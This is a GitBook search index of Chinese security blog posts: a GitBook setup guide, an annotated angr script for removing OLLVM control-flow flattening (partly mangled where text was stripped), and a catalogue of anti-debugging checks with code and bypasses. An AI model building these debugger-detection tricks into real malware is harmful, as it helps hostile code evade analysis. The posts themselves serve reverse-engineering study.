{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction 欢迎来到我的gitbook，这是一个欢迎页，有任何问题或者建议以及bug可以通过邮件 crootkit@gmail.com 发我，不胜感激 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-18 11:15:01 "},"MyArticles/构建gitbook.html":{"url":"MyArticles/构建gitbook.html","title":"写在开始，how2gitbook","keywords":"","body":"如何在化工原理课堂构建gitbook作为自己的博客 hexo和gitbook对比 没啥好对比的，我就感觉hexo用起来比较方便，比如构建博客，挂在公网或者是github上比较方便；但是我认为那个适合作为一个交流平台，不适合用来笔记；所谓大道至简，hexo的便利性导致他的臃肿性。所以才来尝试使用gitbook来构建博客，与其说是博客，不如说是笔记系统，更加方便简单的笔记系统。 gitbook可以根据不同的类型进行分类，左边的目录支持二级目录（实践发现支持三级目录），小母鹿都在文章里的右边。 而且book对于文章的目录管理非常自由，只有buil的时候可以索引到就可以。 可能别的也可以，但是我不知道，如果任何人来找我关于这个进行争论，别怪我没素质下限 gitbook搭建准备 记录搭建的过程，方便以后快速搭建。或者以备不时之需。 环境准备 需要： github账号，就像是hexo那种####.github.io的那种GitHub page仓库。 npm和node环境，npm需要低版本，高版本的不能匹配gitbook。 脑子，百度，google，梯子 git everything，可以帮助我更加方便的找到安装的文件在哪一个目录里 工具下载 npm install gitbook-cli -g 这里注意需要配置环境变量，在 查看高级系统设置 里，添加对应的目录 之前建议npm进行换源，不然下载可能会出问题。 下载结束之后，在cmd里输入 gitbook --version 需要注意的是如果显示找不到gitbook这个命令，则需要仔细的看一下自己的path有没有填入正确的值。 这时gitbook会进行自己的一个安装和配置。 可能的报错 gitbook报错1： npm版本太高，导致安装失败。 gitbook报错2： 找到报错的那个js文件，进去之后把67行左右的三个连续的代码注释掉，注意，一定不能注释报错行的代码，不然就无法自行安装配置gitbook。 解决上述错误之后重复指令 gitbook --version 出现警告无所谓，等一等等他安装完成。就行。成功后应该是 如果只有第一行的话说明不行，需要重新走一遍--version。并且注意一下那个可能会报错的js文件。 本地环境 自己找一个想放置文章的目录，当做gitbook的本地目录。然后进入目录 我这里用的目录是D:\\myGitbook，进入目录执行： gitbook init 如果没有在目录下生成两个md文件，说明你配错了。建议全部删除然后在npm官网下载msi文件进行安装，而不是下载zip，至于为啥我也不知道，你要是知道可以给我发邮件 crootkit@gmail.com 不胜感激。 目录下的 SUMMARY.md是很重要的，他决定了gitbook左边的目录。通过研究这个文件，可以发现他是怎么对文章进行索引的，这也可以根据他的格式来看到如何索引到我们的文章，所以我在该目录下创建了一个新的目录用来放置我的md文章。 通过命令 gitbook build 可以对本地的项目进行build，这个命令也集合到了gitbook serve里，但是我还是喜欢先build一下。 serve命令可以在本地起一个端口，类似于hexo s命令。 可以在本地起一个服务进行预览。 类似与这样的形势，就是成功了。 下载插件 在稀土掘金上找到了说是需要的12个插件，我稍微删改了一下。 插件需要写在D:\\myGitbook\\book.json中，我的是这样的。 { \"plugins\": [ \"back-to-top-button\", \"chapter-fold\", \"code\", \"splitter\", \"-lunr\", \"-search\", \"search-pro\", \"custom-favicon\", \"tbfed-pagefooter\", \"popup\", \"-sharing\", \"sharing-plus\", \"intopic-toc\" ], \"pluginsConfig\": { \"favicon\": \"./icon/book.ico\", \"tbfed-pagefooter\": { \"copyright\": \"没有版权，随便复制，免费的知识应该共享\", \"modify_label\": \"该文章修订时间：\", \"modify_format\": \"YYYY-MM-DD HH:mm:ss\" }, \"sharing\": { \"douban\": true, \"facebook\": true, \"google\": true, \"pocket\": true, \"qq\": true, \"qzone\": true, \"twitter\": true, \"weibo\": true, \"all\": [ \"douban\", \"facebook\", \"google\", \"instapaper\", \"linkedin\", \"twitter\", \"weibo\", \"messenger\", \"qq\", \"qzone\", \"viber\", \"whatsapp\" ] } } } 然后执行一下gitbook install就可以按部就班的下载了。 当你想添加一个插件时，我是这样解决的： 首先讲原先的book文件改名 建立新的book文件然后写入要更新的插件，进行install操作 然后讲两个book合并 如果新增插件的数量不是很多，可以采用单独下载的方式然后将插件的名称合并到之前book中。 注意：如果在build的时候没有将之前的book合并的话，会出现之前的插件无法索引的情况。 根据网络因素决定下载速度。 下载完成执行 gitbook build gitbook serve 托管到drootkit.github.io 明确一点 进行build之后，会在目录下生成一个_book目录，里面有一个index文件，这个文件就是整个完整的网页。 所以我们只需要把这个目录里的内容同步到github上去就行。 目录里的内容不全是网页需要用到的内容，我们可以创建一个.gitignore里面包含一些不需要提交到网页上的文件。 注意：每一次的build都会刷新_book目录下的所有的文件，导致.git会消失，所以就新建一个目录，每次生成的东西有用的放进去，既省去了gitignore也防止了git每次被刷没。 在这个新的目录里，build之后将生成的文件直接复制进去就可以，但是需要注意的是不要把里面的.git给覆盖掉，里面的git文件夹经过第一次配置好之后，后续就可以直接进行push了，相对比较方便。 上线gitbook 进行build之后，进入_book文件夹： git init #初始化本地git仓库 方法有很多，反正只要把这些文件push上去就行。 至于github的配置，参考hexo的github配置，那个信息比较多。 git config --global user.name \"###\" git config --global user.email \"###@4444.***\" 绑定远程仓库 git remote add origin 你的远程仓库地址 绑定之后因为本地还是master，远程一般是main，所以改一下本地分支 git config --global init.defaultBranch main 然后就三件套 git add . git commit -m \"必须写注释，不然报错\" git push #用-f来强制覆盖之前远程仓库里的东西 然后网页登录看看仓库里有没有东西，有了之后等一会，直接去访问网址就可以访问到gitbook了。 可能的报错 remote 1 遇到push失败（常见于更新的时候） 尝试强制覆盖 git push -u origin main -f 即可成功 2 遇到的新问题，当存在两个名称一样的标题的时候，会自动定位到第一个标题，所以这里的可能的报错我将其后面跟上了remote 玩的开心 可能的自动化脚本 能我哪天把这个搞差不多清楚了还是要写一个自动化的脚本的。不然每次都要手动复制可太麻烦了，一不注意再把我的git覆盖掉，那可是真的操了狗了。 每次加入新的文章之后都要修改summary那个md也是一件麻烦事，但是麻烦带来的高度的可操作性，这一点还是很难平衡的。总之我感觉这个是比hexo要好用的，依赖没有hexo那么多，相对来说也方便配置一点。 import os # 删除git目录中的没有用的md文件，只上传html文件，效果一样（md和png） def cleanGit(): path = 'D:\\\\myGitbook\\\\commit_dir\\\\MyArticles' for root, dirs, files in os.walk(path): for name in files: if (name.endswith(\".md\") or name.endswith(\".png\")): print(name) print(os.path.join(root, name)) os.remove(os.path.join(root, name)) # 删除空目录 # for root, dirs, files in os.walk(path): # if not os.listdir(root): # os.rmdir(root) # 清理本地的build目录，文本和图片 def cleanLocal(): path = 'D:\\\\myGitbook\\\\localOpreat\\\\_book\\\\MyArticles' for root, dirs, files in os.walk(path): for name in files: if (name.endswith(\".md\") or name.endswith(\".png\")): print(name) print(os.path.join(root, name)) os.remove(os.path.join(root, name)) # 删除空目录 # for root, dirs, files in os.walk(path): # if not os.listdir(root): # os.rmdir(root) cleanGit() 删除空目录的代码会出问题，暂时就不写了。 因为每一次写文章都要走一遍过程，相对比较麻烦，于是决定每周向github更新一次或者啥时候开心了就向github推送更新一次。 可能的错误 1、 Error: EISDIR: illegal operation on a directory, read 出现这个错误，就是summary文件出现了 问题，里面可能是某一个目录的地址有问题，通过排查或者重写可以解决。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 22:01:22 "},"SUMMARY.html":{"url":"SUMMARY.html","title":"所有目录","keywords":"","body":"Summary Introduction 写在开始，how2gitbook 所有目录 Reverse 反控制流平坦化学习-angr 反调试以及沙箱对抗技巧收集 加密解密学习 - 更 分组密码 vmp3.X 工具向脱壳 运行时压缩壳 - IDA动调ELF脱壳 Basics PE文件加载器-基于C 调试C#的DLL 调用约定和断点 ELF structure PE structure ARM 基础学习 Windows消息队列 内网基础学习 - 域和组 Practice Malware-APK0 edr对抗 - OODA 角度 蓝屏 - windbg模块解析 失效的欺骗 - 假杀软欺骗真winDef 云原生安全 云原生 - 是什么 Daily notes G-F-W原理了解学习 电子书清晰化的尝试 利用python 搭建ipv6自有服务器 Shell 学习 就业意向 Development Find DLL in Process Find Thread in Process 构建qemu的持续学习 查看父进程 CyberSec 免杀手法收集 YARA学习 sigma规则学习 工作内容 - 产出snort规则 啥是Bitcoin 从痛苦金字塔学习分析报告 TEB & PEB 进程注入-前置 windows下的进程注入（6种） Dll注入的3.5种方式 DLL注入-突破session0 dll劫持原理以及方式实践 Hook - R3 Vulnerability Mining CTF - PWN 学习 栈的艺术 堆的艺术 shellcode编写-地址定位 winafl文献-关于pdf中的图片测试(极水) Tool usage 自定义git公钥配置-常见问题 honggfuzz使用-安装 WinAFL 使用 GDB使用 Fiddler学习 windbg使用 真假C&C - fakenet Botnet mirai源码分析学习 dlr loader bot cnc tools boat （ripper）家族起底分析报告 NTP botnet 7月样本分析报告 Muhstik 家族最新攻击分析报告 Andoryu家族祖孙三代分析报告 某 - 家族发现起底报告 总结 - botnet 还有 实习 Windows kernel学习 开发、调试环境 概述 - 藏匿程序的方式 Hello Kernel！ 字符串 - 但是内核安全 链表 - 遍历用户进程 链表 - 遍历内核模块 计时器 - IO还有DPC SSDT - 是啥、干啥、怎么用 SSDT - SSSDT Bypass Anti-virus 学习 - OpenARK 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-28 17:36:09 "},"MyArticles/Reverse.html":{"url":"MyArticles/Reverse.html","title":"Reverse","keywords":"","body":"记录关于在CTF竞赛中的一些逆向题目的题解和一些在五湖四海学来的逆向知识。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-18 16:39:04 "},"MyArticles/Re/控制流平坦化.html":{"url":"MyArticles/Re/控制流平坦化.html","title":"反控制流平坦化学习-angr","keywords":"","body":"平坦化混淆 环境 ubuntu18（Windows上尚未成功） git clone https://github.com/obfuscator-llvm/obfuscator.git 编译上述项目然后make all（耗时较长） clang test.c -o test -mllvm -fla 基本结构 这是在静态分析中最恶心的一种方式，因为没有完美的脚本可以完全去除混淆的影响 OLLVM中使用到的一种代码保护方式，它还有2个兄弟-虚假控制流和指令替换，这3种保护方式可以累加，对于静态分析来说混淆后代码非常复杂。 控制流平坦化的主要思想就是以基本块为单位，通过一个主分发器来控制程序的执行流程。类似于VMP保护的一种形式。这种保护的缺点是混淆之后的程序结构图格式非常固定，可以根据架构进行反推逆向。 while+switch的结构，其中的switch可以理解为主分发器。通过ida观察可以很清楚的发现流程图都是正方形或者长方形。 通过简单代码的对比，不难发现混淆之后的区别 会看到出现了很多的while和if，符合了开头那张图，主分发器进行程序控制，执行完一个小块后返回主分发器 测试代码 #include int main() { char input[128]; printf(\"please input the string\\n\"); scanf(\"%s\", input); if(input[0] == 'f' && input[1] == 'l') { printf(\"frist input is right\\n\"); if(input[2] == 'a' && input[3] == 'g') { printf(\"second flag is right\\n\"); } else { printf(\"second flag is wrong\\n\"); } } else { printf(\"frist flag is wrong\\n\"); } return 0; } 利用clang分别进行正常编译和混淆编译 正常编译 混淆编译 看到经过混淆的程序的CFG图已经很方正了 deflat.py 复原程序主要会用到的脚本是deflat.py其中的主要原理就是angr。 脚本分析 这种脚本有很多的版本，这里随便找了一个版本来做，每一个版本的基本原理基本一致。这个是python3版本。 为了方便分析，已经把主要结构和会用到的函数合并到同一个代码里了。 #!/usr/bin/env python3 import sys sys.path.append(\"..\") import argparse import angr import pyvex import claripy import struct from collections import defaultdict import am_graph from util import * import logging logging.getLogger('angr.state_plugins.symbolic_memory').setLevel(logging.ERROR) # logging.getLogger('angr.sim_manager').setLevel(logging.DEBUG) def get_relevant_nop_nodes(supergraph, pre_dispatcher_node, prologue_node, retn_node): # 创建 相关列表 和 nop列表 并且这俩列表返回到主函数 relevant_nodes = [] nop_nodes = [] # 遍历超图中的每一个节点 for node in supergraph.nodes(): # 检查当前节点到pre_dispatcher_node是不是存在边，判断节点是否在关键执行路径上 # 通过对节点的大小是不是大于8，来二次判断是不是有意义的节点，还是虚假的节点 if supergraph.has_edge(node, pre_dispatcher_node) and node.size > 8: # XXX: use node.size is faster than to create a block relevant_nodes.append(node) continue # 对于不是相关节点的点，检查是否是应该排除的节点（与关键执行路径无关的代码） if node.addr in (prologue_node.addr, retn_node.addr, pre_dispatcher_node.addr): continue # 不是上述节点，则当作是可以进行nop的节点 nop_nodes.append(node) return relevant_nodes, nop_nodes def symbolic_execution(project, relevant_block_addrs, start_addr, hook_addrs=None, modify_value=None, inspect=False): def retn_procedure(state): # 删除先前使用 project.hook() 设置的挂钩。这里通过一个没有修改的hook达到遇见call直接返回的目的 ip = state.solver.eval(state.regs.ip) project.unhook(ip) return # 在符号执行期间检查处于 angr 状态的语句 def statement_inspect(state): # 提取正在检查的语句的表达式组成列表放到expressions中 expressions = list(state.scratch.irsb.statements[state.inspect.statement].expressions) # 表达式列表的长度不为零且第一个表达式的类型为 pyvex.expr.ITE（表示 VEX 中间语言中的 if-then-else 表达式） if len(expressions) != 0 and isinstance(expressions[0], pyvex.expr.ITE): # 将 modify_value 分配给表示 angr 状态下的条件表达式的临时变量。来达到修改条件表达式的值的目的 state.scratch.temps[expressions[0].cond.tmp] = modify_value # 删除为正在检查的语句设置的断点，以便将来不会对同一语句再次进行检查 state.inspect._breakpoints['statement'] = [] # 判断是否存在hook地址，默认不存在 if hook_addrs is not None: # 根据不同的架构选择不同的长度 skip_length = 4 if project.arch.name in ARCH_X86: skip_length = 5 # hook表中所有的跳转地址 for hook_addr in hook_addrs: # 程序运行到这里跳转到hook project.hook(hook_addr, retn_procedure, length=skip_length) # 在起始地址 start_addr 处初始化空白状态并删除 LAZY_SOLVES 选项 state = project.factory.blank_state(addr=start_addr, remove_options={angr.sim_options.LAZY_SOLVES}) # 如果 inspect 为 True，则在每个语句处设置一个断点，以允许在每个语句处检查程序状态 if inspect: # 当符号执行到达语句执行事件时，会调用statement_inspect函数；根据modify_value参数修改正在执行的语句中的ITE表达式 state.inspect.b('statement', when=angr.state_plugins.inspect.BP_BEFORE, action=statement_inspect) # 从给定的 start_addr 开始执行符号执行 sm = project.factory.simulation_manager(state) # 一步一步的来执行，方便控制 sm.step() while len(sm.active) > 0: for active_state in sm.active: # 状态到达 relevant_block_addrs 中的地址之一，则返回该地址 if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() # 没有任何状态到达 relevant_block_addrs 中，则返回 None return None def fill_nop(data, start_addr, length, arch): # 先判断程序架构是x86还是arm if arch.name in ARCH_X86: # 遍历地址，将nop指令转换成字节码写进去 for i in range(0, length): data[start_addr + i] = ord(OPCODES['x86']['nop']) elif arch.name in ARCH_ARM | ARCH_ARM64: # 同上 if arch.name in ARCH_ARM: nop_value = OPCODES['arm']['nop'] else: nop_value = OPCODES['arm64']['nop'] # 判断大小端序 if arch.memory_endness == \"Iend_BE\": nop_value = nop_value[::-1] # arm架构的对其特性，x86就没这毛病 for i in range(0, length, 4): data[start_addr+i] = nop_value[0] data[start_addr+i+1] = nop_value[1] data[start_addr+i+2] = nop_value[2] data[start_addr+i+3] = nop_value[3] def ins_j_jmp_hex_x86(cur_addr, target_addr, j_cond): # 获得跳转指令的字节码 if j_cond == 'jmp': j_opcode = OPCODES['x86']['jmp'] j_ins_size = 5 else: j_opcode = OPCODES['x86']['j'] + OPCODES['x86'][j_cond] j_ins_size = 6 # 计算跳转的偏移 jmp_offset = target_addr - cur_addr - j_ins_size # 计算跳转在程序中的真正偏移(计算上指令本身) patch_ins_hex = j_opcode + struct.pack(' target_addr: patch_ins_hex = struct.pack('> 12 分析 该主要是使用了angr符号执行的一些方式。具体思路可以总结为按照平坦化混淆之后的CFG结构来进行反混淆，这种方式对于混淆的手法有一定的依赖性，如果微调混淆结构，那么这个脚本就寄了。或者不能高度还原了。 顺序 定位序言快，结束快，真实代码快。剩下的就是垃圾快 函数的开始地址为序言的地址 序言的后继为主分发器 后继为主分发器的块为预处理器 后继为预处理器的块为真实块 无后继的块为retn块 剩下的为无用块 这里可以充分利用ida里的 synchronize with 功能，然后点击下面的真实代码，就可以在伪c代码中定位到相关的代码了。 CFG 程序控制流图CFG angr中的CFG分为2种： CFGFast CFGAccurate 两者的区别在于前者计算的东西更少，从而也就更快。一般情况下CFGFast就够了，但在研究中若要依靠CFG进一步分析的话可能就需要了，更精准当然也就更慢 CFG()是CFGFast()的子类，也就是在CFGFast()基础上的一个包装。利用CGF将程序变成二维之后，就可以后续找块找边了。 找头尾 # 获取函数序言和函数尾声（push 和 ret） # 遍历图中的每个节点 prologue_node = None for node in supergraph.nodes(): # 找到函数序言的节点（函数执行的第一个基本块） # in_degree方法返回节点的“入边数”，没有入边，就是第一个块 if supergraph.in_degree(node) == 0: prologue_node = node # 找到函数尾声 # 检查块的出边，为0则说明是最后一个；检查有没有条件分支离开。同时满足为尾声 if supergraph.out_degree(node) == 0 and len(node.out_branches) == 0: retn_node = node 这里通过判断一个节点有没有入边或者出边来判断，头节点没有入边，尾节点没有出边，这个边的概念在fuzz中有明确的解释和定义，用的也更多一些。 然后将定位到的头节点（序言）和给出地址是否一致，不一致就报错 # 在平坦化中，首先要经过一个调度器去执行代码，所以这里检索紧跟在函数序言之后的节点列表，并得到其中的第一个作为调度节点 main_dispatcher_node = list(supergraph.successors(prologue_node))[0] # 遍历 main_dispatcher_node 的每个前驱节点 # 找到紧接在主调度程序节点之前的节点，该节点通常是根据输入状态为调度程序设置参数的节点。 for node in supergraph.predecessors(main_dispatcher_node): # 检查节点的地址是否与函数序言的地址不同，用于排除可能由于不相关的分支而被包含的节点，获得预调度器 if node.addr != prologue_node.addr: pre_dispatcher_node = node break 找到有用块 一般脚本都是通过从块中提取出有用项，将剩下的作为无用项的工作方法。 针对call指令：通过hook后unhook 的形式直接返回，防止符号执行跑出指定范围 def retn_procedure(state): # 删除先前使用 project.hook() 设置的挂钩。这里通过一个没有修改的hook达到遇见call直接返回的目的 ip = state.solver.eval(state.regs.ip) project.unhook(ip) return 发现合法块的主要代码 # 遍历相关节点中的所有节点，不包括返回函数尾声 for relevant in relevants_without_retn: print('-------------------dse %#x---------------------' % relevant.addr) # 每一块当作一个block，创建一个工厂，设置地址和大小 block = project.factory.block(relevant.addr, size=relevant.size) # 设置的一个标志位，检查当前块是否有分支 has_branches = False # 设置一个需要hook地址字典 hook_addrs = set([]) # 遍历当前块中的指令，利用capstone将字节转为汇编代码 for ins in block.capstone.insns: # 基本指令块中是否有任何条件分支（如 cmov 或 mov）或函数调用（如 call 或 bl） if project.arch.name in ARCH_X86: if ins.insn.mnemonic.startswith('cmov'): # 只记录第一个指令分支 if relevant not in patch_instrs: patch_instrs[relevant] = ins # 将标志 has_branches 设置为 True has_branches = True elif ins.insn.mnemonic.startswith('call'): hook_addrs.add(ins.insn.address) elif project.arch.name in ARCH_ARM: if ins.insn.mnemonic != 'mov' and ins.insn.mnemonic.startswith('mov'): if relevant not in patch_instrs: patch_instrs[relevant] = ins has_branches = True elif ins.insn.mnemonic in {'bl', 'blx'}: hook_addrs.add(ins.insn.address) elif project.arch.name in ARCH_ARM64: if ins.insn.mnemonic.startswith('cset'): if relevant not in patch_instrs: patch_instrs[relevant] = ins has_branches = True elif ins.insn.mnemonic in {'bl', 'blr'}: hook_addrs.add(ins.insn.address) # 有分支会用两次来执行，分别走两个路径 if has_branches: tmp_addr = symbolic_execution(project, relevant_block_addrs, relevant.addr, hook_addrs, claripy.BVV(1, 1), True) if tmp_addr is not None: flow[relevant].append(tmp_addr) tmp_addr = symbolic_execution(project, relevant_block_addrs, relevant.addr, hook_addrs, claripy.BVV(0, 1),True) if tmp_addr is not None: flow[relevant].append(tmp_addr) else: tmp_addr = symbolic_execution(project, relevant_block_addrs, relevant.addr, hook_addrs) if tmp_addr is not None: flow[relevant].append(tmp_addr) 把注释删了方便看。通过一个大循环，遍历所有的代码块，然后同时遍历代码块中的代码。如果遇到分支块就进行两次符号执行来遍历所有路径。 程序利用relevant_block_addrs列表存储了所有的有效代码块，他的检查原理是 # 遍历超图中的每一个节点 for node in supergraph.nodes(): # 检查当前节点到pre_dispatcher_node是不是存在边，判断节点是否在关键执行路径上 # 通过对节点的大小是不是大于8，来二次判断是不是有意义的节点，还是虚假的节点 if supergraph.has_edge(node, pre_dispatcher_node) and node.size > 8: # XXX: use node.size is faster than to create a block relevant_nodes.append(node) continue 两个判断条件 当前节点和预处理器是不是存在边（有效块是存在的，除了retn块） 节点的大小是不是>8 来对挑选出有效块，然后来到上面这个嵌套循环的代码中。 关于symbolic_execution函数，最后一个参数来判断是不是存在分支，倒数第二个参数判断分支走向（t or f） def symbolic_execution(project, relevant_block_addrs, start_addr, hook_addrs=None, modify_value=None, inspect=False): def retn_procedure(state): # 删除先前使用 project.hook() 设置的挂钩。这里通过一个没有修改的hook达到遇见call直接返回的目的 ip = state.solver.eval(state.regs.ip) project.unhook(ip) return # 在符号执行期间检查处于 angr 状态的语句 def statement_inspect(state): # 提取正在检查的语句的表达式组成列表放到expressions中 expressions = list(state.scratch.irsb.statements[state.inspect.statement].expressions) # 表达式列表的长度不为零且第一个表达式的类型为 pyvex.expr.ITE（表示 VEX 中间语言中的 if-then-else 表达式） if len(expressions) != 0 and isinstance(expressions[0], pyvex.expr.ITE): # 将 modify_value 分配给表示 angr 状态下的条件表达式的临时变量。来达到修改条件表达式的值的目的 state.scratch.temps[expressions[0].cond.tmp] = modify_value # 删除为正在检查的语句设置的断点，以便将来不会对同一语句再次进行检查 state.inspect._breakpoints['statement'] = [] # 判断是否存在hook地址，默认不存在 if hook_addrs is not None: # 根据不同的架构选择不同的长度 skip_length = 4 if project.arch.name in ARCH_X86: skip_length = 5 # hook表中所有的跳转地址 for hook_addr in hook_addrs: # 程序运行到这里跳转到hook project.hook(hook_addr, retn_procedure, length=skip_length) # 在起始地址 start_addr 处初始化空白状态并删除 LAZY_SOLVES 选项 state = project.factory.blank_state(addr=start_addr, remove_options={angr.sim_options.LAZY_SOLVES}) # 如果 inspect 为 True，则在每个语句处设置一个断点，以允许在每个语句处检查程序状态 if inspect: # 当符号执行到达语句执行事件时，会调用statement_inspect函数；根据modify_value参数修改正在执行的语句中的ITE表达式 state.inspect.b('statement', when=angr.state_plugins.inspect.BP_BEFORE, action=statement_inspect) # 从给定的 start_addr 开始执行符号执行 sm = project.factory.simulation_manager(state) # 一步一步的来执行，方便控制 sm.step() while len(sm.active) > 0: for active_state in sm.active: # 状态到达 relevant_block_addrs 中的地址之一，则返回该地址 if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() # 没有任何状态到达 relevant_block_addrs 中，则返回 None return None 后续代码中通过单步步过来判断地址是否在有效块地址中，来修复块之间的流程关系。 # 从给定的 start_addr 开始执行符号执行 sm = project.factory.simulation_manager(state) # 一步一步的来执行，方便控制 sm.step() while len(sm.active) > 0: for active_state in sm.active: # 状态到达 relevant_block_addrs 中的地址之一，则返回该地址 if active_state.addr in relevant_block_addrs: return active_state.addr sm.step() # 没有任何状态到达 relevant_block_addrs 中，则返回 None 修复流程图 修复流程图的思路是通过将垃圾块进行nop填充，然后重新连接真实代码块。 无跳转的真实代码块后添加jmp指令跳转到下一个真实块 有跳转代码块：将CMOV指令改成相应的条件跳转指令跳向符合条件的分支，再在这条之后添加JMP指令跳向另一分支 完事就能得到一个被修复的代码结构了，但是可能会导致堆栈不平衡，如果平坦化时利用了堆栈或者脚本运行并不那么靠谱。 缺点 参考这位师傅的博客发现这种方式的缺点，之前在运用中确实用到过这些问题，但是并没有去研究观察过。 这篇文章提出了几个问题： angr对arm64指令集的支持不大行 当前的反混淆模式是基于结构特征的，当多次混淆之后就失效了。 patch程序和nop的方式针对简单程序是好用的，但是当一个真实块拥有三个及以上后继节点（通常是一个公共基本块）时，就无法直接patch。 可以通过保存真实块然后重构函数体的关系解决，但是这需要半手动半自动的方式解决。 最后这个师傅给出的解决办法是 利用Unicorn模拟执行框架，记录真实代码块进行复原。有机会研究研究。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-29 18:16:18 "},"MyArticles/Re/反调试 & 沙箱对抗技巧收集.html":{"url":"MyArticles/Re/反调试 & 沙箱对抗技巧收集.html","title":"反调试以及沙箱对抗技巧收集","keywords":"","body":"（一）反调试 在攻击中，为了防止自己恶意代码的泄露，会对攻击样本本身进行反调试和混淆操作。 一、API反调试 IsDebuggerPresent BOOL IsDebuggerPresent(); 经典的反调试API，查询进程环境块(PEB)中的IsDebugged标志。 没有运行在调试器环境中，函数返回0； 调试附加了进程，函数返回一个非零值。 这个直接通过修改返回值可以绕过。或者直接利用“隐藏调试器”选项就可以 CheckRemoteDebuggerPresent 和上述API实现过程基本一致 BOOL CheckRemoteDebuggerPresent( [in] HANDLE hProcess, // 进程的句柄。 [in, out] PBOOL pbDebuggerPresent // 进程被调试则返回TRUE ); 通过修改寄存器的值也可以绕过。比较简单。 NtQueryInformationProcess 这是一个没有公开的在ntdll.dll中的api，可以用来获取程序中指定的结构体内容。 可以利用他读取一些程序中的内容来判断调试技术。直接利用“隐藏调试器”选项就可以 GetLastError 这个需要和几个API搭配使用。 OutputDebugStringA SetLastError GetLastError 如果没有调试进程的话，这个api就会报错，可以提前使用SetLastError来提前设置一个错误值。 void OutputDebugStringA( [in, optional] LPCSTR lpOutputString ); 完事最后利用GetLastError来获取错误值，如果调试的话，这里就会出现问题。 常见搭配： BOOL IsDebugger() { DWORD errorValue = 2234; SetLastError(errorValue); OutputDebugString(\"Test for debugger!\"); return (GetLastError() == errorValue)?TRUE:FALSE; } 类似的模板也可以搭配其他的API函数来使用。 绕过也简单，这个不会直接修改程序，直接修改返回值就行。不能直接利用“隐藏调试器”选项了。 ZwSetInformationThread 设置线程的优先级。通过为线程设置 ThreadHideFromDebugger，可以禁止线程产生调试事件。 NTSYSAPI NTSTATUS ZwSetInformationThread( [in] HANDLE ThreadHandle, [in] THREADINFOCLASS ThreadInformationClass, [in] PVOID ThreadInformation, [in] ULONG ThreadInformationLength ); 原理：调试进程就会被分离出来。该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试 绕过方式：第 2 个参数为 ThreadHideFromDebugger，其值为 0x11。直接修改这个值就可以 debugActiveProcessStop 停止调试器指定的进程 BOOL DebugActiveProcessStop( [in] DWORD dwProcessId // 想停止的调试进程的进程号 ); 函数失败，则返回值为零 查找窗体信息 FindWindow 检索顶级窗口的句柄，该窗口的类名称和窗口名称与指定的字符串匹配。 此函数不搜索子窗口。 此函数不执行区分大小写的搜索。 HWND FindWindowW( [in, optional] LPCWSTR lpClassName, [in, optional] LPCWSTR lpWindowName ); 直接用它和一些调试器的名称进行比较就行。绕过也是直接修改返回值或者是修改字符串。 EnumWindows 通过将句柄传递到应用程序定义的回调函数，枚举屏幕上的所有顶级窗口。 枚举枚举 到最后一个顶级窗口或回调函数返回 FALSE 为止。并将窗口句柄传送给应用程序定义的回调函数。 BOOL EnumWindows( [in] WNDENUMPROC lpEnumFunc, [in] LPARAM lParam ); 常用代码结构。 BOOL CALLBACK EnumWndProc(HWND hwnd, LPARAM lParam) { char cur_window[1024]; GetWindowTextA(hwnd, cur_window, 1023); if (strstr(cur_window, \"WinDbg\")!=NULL || strstr(cur_window, \"x64_dbg\")!=NULL || strstr(cur_window, \"OllyICE\")!=NULL || strstr(cur_window, \"OllyDBG\")!=NULL || strstr(cur_window, \"Immunity\")!=NULL) { *((BOOL*)lParam) = TRUE; } return TRUE; } 查找进程信息 遍历进程列表 通过进程快照来遍历进程列表，通过字符串比较来判断，绕过直接修改字符串就行 查看父进程 Windows一般默认的父进程就是explore，同时STARTUPINFO结构体的信息也是0。 这个也好绕过，直接修改字符串或者是绕过就行了。 代码校验和检查 计算代码段的校验并实现与扫描中断相同的目的。与扫描0xCC不同，这种检查仅执行恶意代码中机器码CRC或者MD5校验和检查。 时钟检测 如下两种用时钟检测来探测调试器存在的方法。 记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器。 记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。 rdtsc 这是一个汇编指令。 它返回至系统重新启动以来的时钟数，并且将其作为一个64位的值存入EDX:EAX中。恶意代码运行两次rdtsc指令，然后比较两次读取之间的差值。 QueryPerformanceCounter和GetTickCount QueryPerformanceCounter：检索性能计数器的当前值，这是一个高分辨率 ( BOOL QueryPerformanceCounter( [out] LARGE_INTEGER *lpPerformanceCount // 接收当前性能计数器值的变量的指针 ); GetTickCount：检索自系统启动以来已用过的毫秒数，最长为 49.7 天。 DWORD GetTickCount(); 二、手工反调试 手动检查相关结构 使用上述提到的检测调试的api很容易被发现绕过，所以可以手动的实现上述api的功能。 比如检查ProcessHeap位于PEB结构的0x18处。第一个堆头部有一个属性字段，它告诉内核这个堆是否在调试器中创建。 在不同的环境下会显示不同的值。 软件断点检查 恶意代码常用的一种反调试技术是在它的代码中查找机器码0xCC，来扫描调试器对它代码的INT 3修改。repne scasb指令用于在一段数据缓冲区中搜索一个字节。EDI需指向缓冲区地址，AL则包含要找的字节，ECX设为缓冲区的长度。当ECX=0或找到该字节时，比较停止。 硬件断点检查 在Windows下通过获取当前上下文信息context来获得到DR0-DR7这些寄存器的信息。如果没有硬件断点，则这几个寄存器的值都是0。 使用TLS回调 通过注册TLS回调函数在函数入口点之前执行代码，可以起到目的。但是可以将断点设置TLS开始的位置来断住，ida分析也很简单。 一般来说正常编译的程序会开启TLS功能，这时就可以找到TLS表，TLS的结构如下： typedef struct _IMAGE_TLS_DIRECTORY64 { ULONGLONG StartAddressOfRawData; ULONGLONG EndAddressOfRawData; ULONGLONG AddressOfIndex; // PDWORD ULONGLONG AddressOfCallBacks; // PIMAGE_TLS_CALLBACK *; DWORD SizeOfZeroFill; union { DWORD Characteristics; struct { DWORD Reserved0 